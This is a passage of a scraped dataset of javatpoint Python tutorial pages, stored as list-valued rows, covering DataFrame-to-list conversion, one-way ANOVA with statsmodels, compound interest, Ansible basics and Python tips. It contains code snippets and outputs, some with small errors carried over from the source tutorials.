open(""/content/sunflowers1.txt"", ""r"").read()', '# Clean text', ""text = re.sub(r'==.*?==+', '', text)"", ""text = text.replace('\\n', '')"", '# Define a function to plot word cloud', 'def plot_cloud(wordcloud):', '# Set figure size', 'plt.figure(figsize=(40, 30))', '# Display image', 'plt.imshow(wordcloud)', '# No axis details', 'plt.axis(""off"")', '# Generate word cloud', ""wordcloud = WordCloud(width = 3000, height = 2000, random_state=1, background_color='salmon', colormap='Pastel1', collocations=False, stopwords = STOPWORDS).generate(text)"", 'plot_cloud(wordcloud)']",[],[],"[""|||Using Command Prompt||||||Using Anaconda||||||Using Command Prompt||||||Using Anaconda|||&&&|||Open Command Prompt|||Type the given command-|||pip install pandas|||On clicking 'Enter', the packages will start downloading in our system.||||||Open Anaconda Navigator.|||Click on the 'Environment' tab and go to the create option to set up pandas in your system.|||Click on create a button for the Pandas environment.|||In the list of packages, select 'All' to get the filters.|||Go to the search bar and look for 'Pandas' and select the 'Pandas package'.|||Right-click on the checkbox and go to 'Mark for specific version installation'.|||Select the version we want to install and click the 'Apply' button to install the packages.|||""]"
249,['Convert dataframe into list'],"[""In this tutorial, we will learn how we can convert the dataframes into a simple Python list. We will learn about all the methods that we can use to convert dataframe into lists. Before proceeding with the methods, let's have a look at what a dataframe is and how we can create a dataframe in Python using Panda.""]","['https://www.javatpoint.com/anova-test-in-python', 'https://www.javatpoint.com/wordcloud-package-in-python', 'https://www.javatpoint.com/anova-test-in-python', 'https://www.javatpoint.com/wordcloud-package-in-python', 'https://www.javatpoint.com/anova-test-in-python']",[],[],['Pandas Dataframe'],"['Creating a Dataframe in Pandas', 'Converting Dataframe into List', 'Methods to Convert Dataframe into List:', 'Method 1: Converting dataframe while containing all rows', 'Method 2: Converting dataframe into a nested list', 'Method 3: Converting dataframe into a nested list of columns', 'Method 4: Converting dataframe into list with column names included']",[],"['We can create a basic dataframe by the following program using the Pandas module in Python:', ""So, that's how we can create a dataframe using the Panda module and after looking at the output, we can also figure out how a dataframe looks like."", 'We will use the tolist() function from the Panda module in our program in the following way while converting the given dataframe into list:', ""Let's use this function in an example to understand the working of the tolist() function."", ""Now, let's learn about each method with an example to understand them in a better way."", 'In this method, we will convert a given dataframe into a list that will contain all the rows of a particular column from the dataframe.', 'Look at the following program to understand the implementation of this method:', 'So, as we can see in the output that we have converted the famous name column of defined dataframe into a single list and printed it in the output.', 'We will use this method in the following example to understand its implementation:', 'Look at the following program to understand the implementation of this method:', ""That's how we can use this method to convert the given dataframe into a list containing multiple lists of having data from all columns and rows."", 'We will use this method in the following example to understand its implementation:', '*************']","['In this method, we will convert the given dataframe into a nested list that will contain all the rows of all the columns from the dataframe separately.', 'Under this method, we will be converting a given dataframe into a list that will contain multiple lists in it that are having all the columns of a row.', 'We use this method when we want to convert the given dataframe into a list that contains multiple lists having all the columns with column names of dataframe along with rows.']","['The dataframes in the panda module is a 2-D (two-dimensional) size module that is potentially in the heterogeneous tabular data structure with its axes (row & columns), labelled with variables. In simple words, a data frame is a 2-D data structure in which the data is aligned in tabular form.', 'The dataframe can be converted into a Python list in many ways. In this section, we will discuss all the methods that we are going to use to convert a given dataframe into a list. Here, we will use the following four methods with the help of the tolist() function:']","['# Importing Panda module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Print the dataframe as result', 'print(dataFrame)', 'dataframe.tolist()', '# Importing Panda module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Converting dataframe into a list', 'List = dataFrame.values.tolist()', '# Print converted list data as result', 'print(List)', '# Importing Panda module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Converting dataframe Famous Names column into a single list', ""FamousNames = dataFrame['Famous Name'].tolist()"", '# Printing the converted list data', 'print(FamousNames)', '# Importing Pandas module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Initializing empty list', 'ResultList = []', '# Using for loop to iterating through dataframe columns', 'for column in dataFrame.columns:', 'listing = dataFrame[column].tolist()', 'ResultList.append(listing) # appending dataframe columns into list', '# Print the converted list data', 'print(ResultList)', '# Importing Panda module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Converting dataframe into a list', 'List = dataFrame.values.tolist()', '# Print converted list data as result', 'print(List)', '# Importing Panda module as jtp', 'import pandas as jtp', ""GivenData = {'Famous Name':['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker' ],"", ""'Age': [42, 95, 38, 18] }"", '# Creating DataFrame with DataFrame() function', 'dataFrame = jtp.DataFrame(GivenData)', '# Converting dataframe into multiple lists', 'listing = [dataFrame.columns.values.tolist()] + dataFrame.values.tolist()', '# Printing the converted list data', 'print(listing)']","['Famous Name     Age', '0      Stark Iron             42', '1   Captain Rogers       95', '2     Hulk banner       38', '3    Spidy Parker       18', ""[['Stark Iron', 42], ['Captain Rogers', 95], ['Hulk banner', 38], ['Spidy Parker', 18]]"", ""['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker']"", ""[['Stark Iron', 'Captain Rogers', 'Hulk banner', 'Spidy Parker'], [42, 95, 38, 18]]"", ""[['Stark Iron', 42], ['Captain Rogers', 95], ['Hulk banner', 38], ['Spidy Parker', 18]]"", ""[['Famous Name', 'Age'], ['Stark Iron', 42], ['Captain Rogers', 95], ['Hulk banner', 38], ['Spidy Parker', 18]]""]",[],['|||Converting dataframe while containing all rows|||Converting dataframe into a nested list|||Converting dataframe into a nested list of columns|||Converting dataframe into a list with column names included|||']
250,['ANOVA Test in Python'],"['The following tutorial is based on data analysis; we will discuss the Analysis of Variance (ANOVA) in detail, along with the process of carrying it out in the Python programming language. ANOVAs are generally utilized in Psychology studies.']","['https://www.javatpoint.com/python-program-to-find-compound-interest', 'https://www.javatpoint.com/convert-dataframe-into-list', 'https://www.javatpoint.com/python-program-to-find-compound-interest', 'https://www.javatpoint.com/convert-dataframe-into-list', 'https://www.javatpoint.com/python-program-to-find-compound-interest']","['https://static.javatpoint.com/python/images/anova-test-in-python.png', 'https://static.javatpoint.com/python/images/anova-test-in-python2.png', 'https://static.javatpoint.com/python/images/anova-test-in-python3.png', 'https://static.javatpoint.com/python/images/anova-test-in-python4.png', 'https://static.javatpoint.com/python/images/anova-test-in-python5.png', 'https://static.javatpoint.com/python/images/anova-test-in-python6.png', 'https://static.javatpoint.com/python/images/anova-test-in-python7.png']",[],"['Understanding the ANOVA Test', 'ANOVA Test Assumptions', 'Understanding the Types of ANOVA Tests', 'Understanding with Replication and without Replication in ANOVA', 'Understanding the Post-ANOVA Test', 'Understanding One-way ANOVA test in Python']","['One-Way ANOVA Test', 'Two-Way ANOVA Test', 'n-Way ANOVA Test', 'Two-way ANOVA test with Replication', 'Two-way ANOVA test without Replication', 'Importing required libraries', 'The Hypothesis', 'Loading the Data', 'Understanding the Dataset', 'Checking the Missing Values', 'Understanding the distribution of Weight', 'Performing the one-way ANOVA Test']","['Note: If no real difference is present among the tested groups, which is known as the null hypothesis, the F-ratio statistics of the ANOVA Test will be adjacent to 1.']","['However, in order to perform any tests, we first have to define the null and alternate hypotheses:', 'We can write the formula for the One-way ANOVA test as illustrated below:', 'yi - Sample Mean in the ith group', 'ni - Number of Observation in the ith group', 'y - Total mean of the data', 'k - Total number of the groups', 'yij - jth observation in the out of k groups', 'N - Overall sample size', 'Whenever we plot the ANOVA table, we can see all the above components in the following format:', 'Before performing an ANOVA test, we must make certain assumptions, as shown below:', 'The ANOVA Tests can be classified into three major types. These types are shown below:', 'An Analysis of Variance Test that has only one independent variable is known as the One-way ANOVA Test.', 'For instance, a country can assess the differences in the cases of Coronavirus, and a Country can have multiple categories for comparison.', 'An Analysis of Variance Test that has two independent variables is known as a Two-way ANOVA test. This test is also known as Factorial ANOVA Test.', 'An ANOVA Test will provide us a single (univariate) F-value; however, a MANOVA Test will provide us a multivariate F-value.', 'Generally, some of us may hear with replication and without replication in respect to the ANOVA test. Let us understand what these are:', 'The two-way ANOVA test with Replication is carried out when two groups and the members of those groups are performing multiple tasks.', 'The two-way ANOVA test without Replication is carried out when we have only one group, and we are double-testing that same group.', 'Thus, the researcher uses the post hoc test in order to check which groups are different from each other.', 'Now, we will understand only one-way ANOVA test using the Python programming language.', 'We have divided the process of performing the ANOVA test into different sections.', 'In order to begin working with the ANOVA test, let us import some necessary libraries and modules for the project.', 'Let us consider a hypothesis for the problem:', '""For every diet, the mean of the people\'s weights is the same.""', 'Let us consider the following syntax for the same:', 'Once we have successfully imported the dataset, let us print some data to get a sense of it.', 'Now let us print the total number of rows present in the dataset.', 'Now, we have to see if there are any values that are missing in the dataset or not. We can check this by using the following syntax.', 'We can also plot a distribution plot for each Gender in the dataset. Here is a syntax for the same:', 'We can also use the following function to display the distribution plot for each gender.', ""We can observe that there is a slight difference in weight on females in the diet; however, it doesn't seem to affect males."", 'The null hypothesis of the one-way ANOVA test is', 'And this test attempts to check whether this hypothesis is true or not.', 'Let us consider initially determining the confidence level of 95%, which also implies that we will accept only an error rate of 5%.', 'In the above output, we can observe two p-values (PR (> F)): male and female.', 'Let us consider the following snippet of code for the same.']","['In the following tutorial, we will understand how we can carry out ANOVA with the help of the SciPy library, evaluating it ""by hand"" in Python, utilizing Pyyttbl and Statsmodels.', 'We can perform an ANOVA Test by comparing two types of variations. The First variation is between the sample means and the other one within each of the samples. The formula shown below describes one-way ANOVA Test statistics.', 'The output of the ANOVA formula, the F statistic (also known as the F-ratio), enables the analysis of the multiple sets of data in order to determine the variability among the samples and within samples.', 'Suppose that the old age group may have higher cases of Coronavirus overall compared to the young age group; however, this difference could vary in countries in Europe compared to countries in Asia.', 'An Analysis of Variance Test is considered an n-way ANOVA Test if a researcher uses more than two independent variables. Here n represents the number of independent variables we have. This Test is also known as MANOVA Test.', 'For example, we can examine potential differences in cases of Coronavirus using independent variables like Country, Age group, Gender, Ethnicity, and a lot more simultaneously.', 'For instance, suppose that a vaccine for Coronavirus is still under development. Doctors are performing two different treatments in order to cure two groups of patients infected by the virus.', 'For instance, suppose that the vaccine has been developed successfully, and the researchers are testing one set of volunteers before and after they have been vaccinated in order to observe whether the vaccination is working properly or not.', 'While conducting an ANOVA Test, we are trying to determine the statistically significant difference between the groups, if it is available. In case we find one, we will then have to test where the spot of group differences.', 'We could perform post hoc tests which are t-tests inspecting mean differences among the groups. We can conduct several multiple comparison tests to control the Type I error rate, including the Bonferroni, Dunnet, Scheffe, and Turkey tests.', 'In the following problem, we will use a Diet dataset designed by the University of Sheffield. The dataset contains a binary variable as the gender, which consists of 1 for Male and 0 for Female.', ""We can observe that two entries are containing the missing values in the 'gender' column. Now let us find the total percentage of missing values in the dataset."", 'As we can observe, we have approximately 3% of missing values in the dataset. We can either ignore, delete, or classify its gender with the help of the closest Height mean.', 'In the following step, we will be plot a graph using the distplot() function to understand the Weight distribution in the Sample data. Let us consider the snippet of code.', ""Now, we will calculate the mean, median, non-zero count, and standard deviation according to the 'gender' column using the snippet of code given below:"", 'As we can observe, we have estimated the required statistical measurements on the basis of gender. We can also classify these statistical measurements on the basis of gender as well as diet.', 'So, now we understand the effect of diet on females; however, we are not aware of the difference between the diets. So, we will perform a post hoc analysis with the help of the Tukey HSD (Honest Significant Difference) test.', 'As we can observe from the above output, we can only reject the null hypothesis among the 1st and 3rd types of diet, which means that a statistically significant difference is present in weight for diet 1 and diet 3.']","['We can think of an Analysis of Variance Test, also known as ANOVA, to generalize the T-tests for multiple groups. Generally, we use the independent T-test in order to compare the means of the state between two groups. We use ANOVA Test whenever we need a comparison of the means of the state between more than two groups.', ""ANOVA test checks whether a difference in the average somewhere in the model or not (checking whether there was an overall effect or not); however, this method doesn't tell us the spot of the difference (if there is one). We can find the spot of the difference between the group by conducting the post hoc tests."", ""Usually, if the p-value belonging to the F is smaller than 0.05, then the null hypothesis is excluded, and the alternative hypothesis is maintained. In the case of the null hypothesis rejection, we can say that the means of all the sets/groups aren't equal."", ""We can test the assumption of variance homogeneity with the bits of help of tests like the Brown-Forsythe Test or Levene's Test. We can also test the Normality of the score distributions with the help of histograms, the kurtosis or skewness values, or with the help of tests like Kolmogorov-Smirnov, Shapiro-Wilk, or Q-Q plot. We can also determine the assumption of independence from the study design."", 'It is quite noteworthy to notice that the ANOVA test is not robust to violating the assumption of independence. This is to inform that even if someone tries to violate the assumptions of Normality or homogeneity, they can conduct the test and trust the findings.', 'Nevertheless, the outputs of the ANOVA test are unacceptable if the assumption of independence is dishonored. Usually, the analysis, along with the violations of homogeneity, is considered robust if we have equal-sized groups. Resuming the ANOVA test along with violations of Normality is usually fine if we have a large sample size.', 'For example, expanding the above example, a two-way ANOVA can examine the difference in the cases of Coronavirus (the dependent variable) by Age Group (the first independent variable) and Gender (the second independent variable). The two-way ANOVA can be utilized in order to examine the interaction among these two independent variables. Interactions denote that the differences are uneven across all classes of the independent variables.', ""In the case of males, we can't accept the null hypothesis below the confidence level of 95% because the p-value is larger than the value of alpha, i.e., 0.05 < 0.512784. Thus, no difference is found in the weights of males after providing these three types of diet."", 'In the case of females, since the p-value PR (> F) is below the rate of error, i.e., 0.05 > 0.010566, we could reject the null hypothesis. This statement indicates that we are pretty confident about the fact that there is a difference in terms of height for females in diets.']","['import pandas as pd', 'import matplotlib.pyplot as plt', 'import statsmodels.api as sm', 'from statsmodels.formula.api import ols', 'import seaborn as sns', 'import numpy as np', 'import pandas.tseries', ""plt.style.use('fivethirtyeight')"", ""mydata = pd.read_csv('Diet_Dataset.csv')"", 'print(mydata.head())', ""print('The total number of rows in the dataset:', mydata.size)"", 'print(mydata.gender.unique())', '# displaying the person(s) having missing value in gender column', ""print(mydata[mydata.gender == ' '])"", ""print('Percentage of missing values in the dataset: {:.2f}%'.format(mydata[mydata.gender == ' '].size / mydata.size * 100))"", 'f, ax = plt.subplots( figsize = (11,9) )', ""plt.title( 'Weight Distributions among Sample' )"", ""plt.ylabel( 'pdf' )"", 'sns.distplot( mydata.weight6weeks )', 'plt.show()', 'f, ax = plt.subplots( figsize = (11,9) )', ""sns.distplot( mydata[mydata.gender == '1'].weight6weeks, ax = ax, label = 'Male')"", ""sns.distplot( mydata[mydata.gender == '0'].weight6weeks, ax = ax, label = 'Female')"", ""plt.title( 'Weight Distribution for Each Gender' )"", 'plt.legend()', 'plt.show()', 'def infergender(x):', ""if x == '1':"", ""return 'Male'"", ""if x == '0':"", ""return 'Female'"", ""return 'Other'"", 'def showdistribution(df, gender, column, group):', 'f, ax = plt.subplots( figsize = (11, 9) )', ""plt.title( 'Weight Distribution for {} on each {}'.format(gender, column) )"", 'for groupmember in group:', ""sns.distplot(df[df[column] == groupmember].weight6weeks, label='{}'.format(groupmember))"", 'plt.legend()', 'plt.show()', 'uniquediet = mydata.Diet.unique()', 'uniquegender = mydata.gender.unique()', 'for gender in uniquegender:', ""if gender != ' ':"", ""showdistribution(mydata[mydata.gender == gender], infergender(gender), 'Diet', uniquediet)"", ""print(mydata.groupby('gender').agg("", '[ np.mean, np.median, np.count_nonzero, np.std ]', ').weight6weeks)', ""print(mydata.groupby(['gender', 'Diet']).agg("", '[np.mean, np.median, np.count_nonzero, np.std]', ').weight6weeks)', ""mymod = ols('Height ~ Diet', data = mydata[mydata.gender == '0']).fit()"", '# performing type 2 anova test', 'aovtable = sm.stats.anova_lm(mymod, typ = 2)', ""print('ANOVA table for Female')"", ""print('----------------------')"", 'print(aovtable)', 'print()', ""mod = ols('Height ~ Diet', data = mydata[mydata.gender=='1']).fit()"", '# performing type 2 anova test', 'aovtable = sm.stats.anova_lm(mymod, typ = 2)', ""print('ANOVA table for Male')"", ""print('----------------------')"", 'print(aovtable)', 'from statsmodels.stats.multicomp import pairwise_tukeyhsd, MultiComparison', '# using the female data only', ""mydf = mydata[mydata.gender == '0']"", '# comparing the height between each diet, using 95% confidence interval', ""multiComp = MultiComparison(mydf['Height'], mydf['Diet'])"", 'tukeyres = multiComp.tukeyhsd(alpha = 0.05)', 'print(tukeyres)', ""print('Unique diet groups: ', multiComp.groupsunique)""]","['Person gender  Age  Height  pre.weight  Diet  weight6weeks', '0      25          41     171          60     2          60.0', '1      26          32     174         103     2         103.0', '2       1      0   22     159          58     1          54.2', '3       2      0   46     192          60     1          54.0', '4       3      0   55     170          64     1          63.3', 'The total number of rows in the dataset: 546', ""[' ' '0' '1']"", 'Person gender  Age  Height  pre.weight  Diet  weight6weeks', '0      25          41     171          60     2          60.0', '1      26          32     174         103     2         103.0', 'Percentage of missing values in the dataset: 2.56%', 'mean  median  count_nonzero        std', 'gender', '81.500000    81.5            2.0  30.405592', '0       63.223256    62.4           43.0   6.150874', '1       75.015152    73.9           33.0   4.629398', 'mean  median  count_nonzero        std', 'gender Diet', '2     81.500000   81.50            2.0  30.405592', '0      1     64.878571   64.50           14.0   6.877296', '2     62.178571   61.15           14.0   6.274635', '3     62.653333   61.80           15.0   5.370537', '1      1     76.150000   75.75           10.0   5.439414', '2     73.163636   72.70           11.0   3.818448', '3     75.766667   76.35           12.0   4.434848', 'ANOVA table for Female', '----------------------', 'sum_sq    df        F    PR(>F)', 'Diet       559.680764   1.0  7.17969  0.010566', 'Residual  3196.086677  41.0      NaN       NaN', 'ANOVA table for Male', '----------------------', 'sum_sq    df        F    PR(>F)', 'Diet       559.680764   1.0  7.17969  0.010566', 'Residual  3196.086677  41.0      NaN       NaN', 'Multiple Comparison of Means - Tukey HSD, FWER=0.05', '=====================================================', 'group1 group2 meandiff p-adj   lower    upper  reject', '-----------------------------------------------------', '1      2  -3.5714 0.5437 -11.7861  4.6432  False', '1      3  -8.7714 0.0307  -16.848 -0.6948   True', '2      3     -5.2 0.2719 -13.2766  2.8766  False', '-----------------------------------------------------', 'Unique diet groups:  [1 2 3]']",[],['|||Null Hypothesis:There is no noteworthy difference between the groups.|||Alternate Hypothesis:There is a noteworthy difference between the groups.||||||We can obtain observations randomly and independently from the population defined by the factor levels.|||The data for every level of the factor is distributed generally.|||Case Independent: The sample cases must be independent of each other.|||Variance Homogeneity: Homogeneity signifies that the variance between the group needs to be around equal.||||||One-Way ANOVA Test|||Two-Way ANOVA Test|||n-Way ANOVA Test|||']
251,['Python program to find compound interest'],"[""In this tutorial, we will learn how to write a Python program to find compound interest for a given value. Before we proceed with writing the program, let's first under the basics of compound interest.""]","['https://www.javatpoint.com/ansible-in-python', 'https://www.javatpoint.com/anova-test-in-python', 'https://www.javatpoint.com/ansible-in-python', 'https://www.javatpoint.com/anova-test-in-python', 'https://www.javatpoint.com/ansible-in-python']",[],[],"['Compound interest', 'Code Implementation']",['The formula for compound interest:'],[],"['Fact: Compound interest is the standard method of interest calculation in banking, finance, and economics.', 'The general mathematical formula for calculating compound interest on a given principal value, i.e., V, is given below:', 'In the above formula, the variables we have used in it can be described as given below:', 'Total amount = Principal value + Compound interest gained', 'P = Principal value', 'tp = Time period for which Principal value is invested', 'r = Rate of interest', 'Step 1: We will take the principal amount as user input.', 'Step 2: Then, we ask the user to set the rate of interest and the time period for which the principal amount is invested.', ""Step 4: We will store the result in a 'Result variable'."", 'Step 5: In the last, we will print the compound interest as a result in the output of the program.', 'Now, look at the following Python program to better understand the implementation of the above given steps:', 'Explanation -']","[""Let's compare compound interest and simple interest. We can see that, in simple interest, there is no compounding of interest on principal values, and gained interest remains the same on every cycle."", 'Till now, we have learned the basics of compound interest and how important it is in our daily life. We have also learned about the basic formula that we can use for calculating the Compound interest for a certain principal value.', 'Now, in this section, we will write a Python program to calculate the compound interest for a given certain value. For writing the required Python program, we have to follow certain steps, which are given below:', 'Step 3: After taking all the three required variables from the user, we will use the compound interest formula, i.e., ""Total Amount = P(1+r/100)tp,"" on these variables in the program.']","['The addition of interest in the given principal value for the deposit or loan is called compound interest, and it is also known as interest on interest. Compound interest is basically the result of reinvesting the gained interest on principal value, rather than taking or paying it out, which will result in the next period of interest; the paid interest will be added to the principal amount.', 'After running the above program, we have given three required variables, i.e., PV = 600000, Crate = 2.7, and tp = 20; we got the total compound interest and total value (1022257.0687807774) that we will get on the given principal value and printed the result in the output. We can calculate the compound interest on any given amount for any rate of interest and for any time period using this program.']","['# Using default function', 'def compound_rate(PV, CRate, tp):', '# Using CI formula', 'TotalAmount = PV * (pow ((1 + CRate / 100), tp))', '# Calculating CI', 'CInterest = TotalAmount - PV', '# Printing CI as result in output', 'print(""Total return value after completion of given time period: "", TotalAmount)', 'print(""Compound interest gained on given amount is"", CInterest)', '# Taking principal amount value from the user', 'PV = float(input(""Enter the principal amount: ""))', 'CRate = float(input(""Enter the rate for compound interest: "")) # taking interest rate value', 'tp = float(input(""Enter the time period for which principal is invested: "")) # taking time period value', '# Calling out CI function', 'compound_rate(PV, CRate, tp)']","['Enter the principal amount: 600000', 'Enter the rate for compound interest: 2.7', 'Enter the time period for which principal is invested: 20', 'Total return value after completion of given time period:  1022257.0687807774', 'Compound interest gained on given amount is 422257.0687807774']",[],[]
252,['Ansible in Python'],"['In the following tutorial, we will understand Ansible along with its benefits and how we can use Ansible in Python.']","['https://www.javatpoint.com/python-important-tips-and-tricks', 'https://www.javatpoint.com/python-program-to-find-compound-interest', 'https://www.javatpoint.com/python-important-tips-and-tricks', 'https://www.javatpoint.com/python-program-to-find-compound-interest', 'https://www.javatpoint.com/python-important-tips-and-tricks']",[],[],"['An Introduction to Ansible', 'What is Ansible?', 'Some Benefits of Ansible', 'Understanding the Python API for Ansible Purpose']",[],"[""Note: This API is envisioned for the internal use of Ansible. Ansible may make alterations to this API at any time that could break backward compatibility with API's older versions. Due to this, Ansible does not support the Python API for any external use. If we want to utilize the Python API only to execute the modules or playbooks, first of all, we will consider an ansible-runner.""]",[],[],"['Ansible is an open-source platform or automation tool utilized to perform IT tasks like deploying applications, managing configurations, orchestrating intra-service, and provisioning. Automation is the key as time passes by, with a highly complex environment of Information Technologies that often require to scale too quickly for developers and system administrators in order to work along if they had to perform every function manually. Automation helps in simplifying the intricate tasks and makes the works of developers much manageable. It also allows the developers to focus attention on other activities that include values to an organization. In other terms, Automation increases efficiency by freeing up time. And Ansible, as stated above, is among the swiftly rising tools in the era of Automation.', 'Being a powerful automation engine, Ansible helps developers in deploying software more efficiently. We can avoid agents, custom code, or custom scripting and mainly focus on security, easy audibility, review, and rewriting of the content. There are numerous advantages of Ansible over similar platforms used for software automation. Some of these advantages are described below:', 'We can call Ansible code using Python using the Application Programming Interface (API) of Ansible. Ansible has released version 2.0 of its API that allows better integration with different programming languages. It is quite a significant aspect to note that Ansible has extended its capability in order to support development with the help of Python; however, it is also mentioned on its website that it can also stop supporting the API framework on the basis of its own discretion (creating or even fixing a bug in the current version of API).', 'There are different methods available for the developers to utilize Ansible from an Application Programming Interface (API) perspective. We can utilize the Ansible API for the Python programming language that allows us to control nodes. We can extend Ansible to respond to different events in Python, write plugins and plugin inventory data from external sources of data.']",[],[],[],"[""|||Ansible is a push-based Infrastructure as code (IaC) that provides a user-friendly domain-specific language so we can define the architecture as per desire in a declarative way.|||The term push-based signifies that Ansible utilizes SSH to communicate among the machine executing Ansible and the machines where the configurations are being applied.|||The machines working with Ansible that we like to configure are known as managed nodes or Ansible hosts. In terms of Ansible, the list of hosts is known as an inventory.|||The machine reading the definition files and executing Ansible in order to push the configuration to the host is known as a control node.|||Ansible is written in the Python programming language and has a quite minimal learning curve. The procedure to set up Ansible is pretty simple and doesn't rely on any extra application, servers, or client daemons.|||Ansible is based on the principle of embracing the interrelation and architecture of the system. Like other tools used for managing configuration (such as Puppet, Chef, or Salt), it works with two types of servers: controlling machines and nodes.|||Ansible uses small programs known as Ansible Modules in order to orchestrate nodes. These modules are the resource models of the chosen system state executed over SSH. We do not need any agents and extra custom security infrastructure for this purpose.|||The library of modules can exist in any machine. The modules perform tasks using JSON protocol over the standard output and write the convenient code in any programming language, including Python.|||The system utilizes YAML in Ansible playbooks format in order to describe the work for Automation. This way, it is the machine as well as human-friendly. And when the nodes are not being managed by Ansible, it doesn't consume resources since neither programs nor daemons are running in the background.||||||Simplicity:Ansible provides simplicity as the developers do not require writing scripts or custom code for the deployment of the applications and updating them. It allows Automation in a language approaching plain English. It is easy for developers, system administrators, and IT managers to read, manage and speed up their projects and programs.|||Completeness:Ansible also provides completeness as it comes combined with different complex tools for managing configuration, deploying applications, orchestrating workflow, and even cloud provisioning in a single system. Modules help in automating nearly everything out-of-the-box, and no extra application is required.|||Secureness:Ansible utilizes SSH, so it doesn't deploy vulnerable agents to nodes and doesn't require daemons on root-level or extra ports. Ansibles offers an agentless environment that helps in improving security and can be usable as non-root. Ansible features in-built authentication for Operating System, support for LDAP, SSSD, and Kerberos.|||""]"
253,['Python Important Tips and Tricks'],"['For all the Python developers or any other language developers, it is always fascinating to know about the tricks and tips of the programming language that we are learning. As we all know that Python is one of the most preferred programming languages among developers. Therefore, in this tutorial, we bring the essential tips and tricks in Python that every Python developer should know.']","['https://www.javatpoint.com/python-coroutines', 'https://www.javatpoint.com/ansible-in-python', 'https://www.javatpoint.com/python-coroutines', 'https://www.javatpoint.com/ansible-in-python', 'https://www.javatpoint.com/python-coroutines']",[],[],['10 Essential Tips and Tricks for Python'],"['1. Creating a single string from elements of a list:', '2. Python use of Enums:', '3. Printing path of the imported module:', '4. Printing the most occurred element of a list:', '5. Printing given string number of times:', '6. wapping of two variable numbers:', '7. Using chain of comparison operators:', '8. Reversing a given string:', '9. eturning multiple values from a single function:', '10. Checking for anagram words:']",[],"['Here is the list of such ten essential Python tips and tricks that every Python developer should know:', 'Example: Looking at the following Python program:', 'We can also do in-place swapping of two variables numbers so we can use their swapped values in the program.', 'Example: Look at the following Python program:', 'We can use the chain of comparison operator to compare the given variable number with multiple values in a single comparison.', 'Example: Look at the following Python program:', 'We can perform this action of checking anagram words, by using the following two methods:', 'a. Without importing an external module in program:', 'Look at the following example Python program:', 'b. By importing an external module in program:']","['If we need to print the file directory or path for the Python modules we have imported in the programs, then we just have to use the module name inside the print statement simply, and the file directory will be printed in the output.', ""We can print a given string 'n' number of times in the output simply by using 'String Name * n' syntax into the print statement. It will print the given string n number of times in continuation in output."", 'Sometimes, we have a given string variable, and we may have to print or use the reverse order of that string. Therefore, we should know the easiest way to print the reverse format of a given string.', 'We can print the multiple values or elements from a given single function simply by using only one print statement. It will save a lot of time for us from writing multiple lines of code in the program.', 'Anagram words are the words in which all the letters are the same in two different words, but the letters of words are arranged in a different order within the word. We can check that if the given two words are pair of anagram words or not.']","['The tricks or tips of Python that we are going to discuss here will save us from writing many lines of code and will save a lot of time. These Python tips are tricks that will also help us to bring up our coding game and boost us while competing with other programmers.', 'We can simply create a single string from all the elements of a given list by using ""."" with the join() function inside the print statement with the list variable. So, by this, we can easily get the single string data format from the multiple data elements given in list format.', 'In Python, we can simply use the Enums to check the number of occurrences of a variable inside the given function where it first occurred. We just have to use the word with the function name inside the print statement with the ""."" operator to print the number of the first occurrence of that variable inside the function.', 'We have given a list with a number of elements in it, and there are many elements in it that are repeated more than one time. Now, if we want to print the number of elements that are occurred most in the list and it is the same as finding mode in statistics from the given data of numbers. We use max() and count function to get the result of the most occurred element.']","['# Given data elements in list format', 'GivenList = [""Hello"", ""Python"", ""Developers!"", ""Welcome"", ""to"", ""JavaTpoint""]', '# printing single string using ""."" With join() function', 'print("" "".join(GivenList))', '# define a class for Enums', 'class EnumExample:', 'Hello, Python, Developers, Welcome, to, JavaTpoint, tutorial, of, Python = range(9)', '# printing first number of occurrences of the given variable', 'print(""Occurrence of JavaTpoint: "", EnumExample.JavaTpoint)', 'print(""Occurrence of Hello: "", EnumExample.Hello)', 'print(""Occurrence of Python: "", EnumExample.Python)', 'print(""Occurrence of Welcome: "", EnumExample.Welcome)', '# Importing modules in the program', 'import socket', 'import numpy', 'import os', '# Printing the file directory of module imported in program', 'print(socket)', 'print(numpy)', 'print(os)', '# A list with the number of elements in it', 'GivenList = [24, 21, 27, 29, 17, 23, 29, 34, 67, 23, 21, 29, 19, 63, 29, 27, 35, 21, 29]', '# Printing most occurred number or element in list', 'print(""Most occurred element in the given list: "", max(set(GivenList), key = GivenList.count))', '# Define a string and n number', 'GivenString = ""Welcome to JavaTpoint, Python developers!""', '# Printing string multiple times', 'print(""Given string for n number of times: "")', 'print(GivenString * n)', '# Define two number variables', 'print(""m before swapping: "", m)', 'print(""n before swapping: "", n)', '# In-place swapping variables', 'm, n = n, m', 'print(""m after swapping: "", m)', 'print(""n after swapping: "", n)', '# Defining a number variable', 'num = 31', '# Chaining comparison operators on num variable', 'Result1 = 35 > num > 30', 'Result2 = 17 > num < 35', '# Printing result of comparison', 'print(Result1)', 'print(Result2)', '# Define a string variable', 'GivenString = ""Welcome to JavaTpoint Python Developers!""', 'print(""Given String in program: "", GivenString)', '# Printing reverse of string in the output', 'print(""Reverse of Given string in program is: "", GivenString[::-1])', '# Define a default functions', 'def multival():', 'return 24, 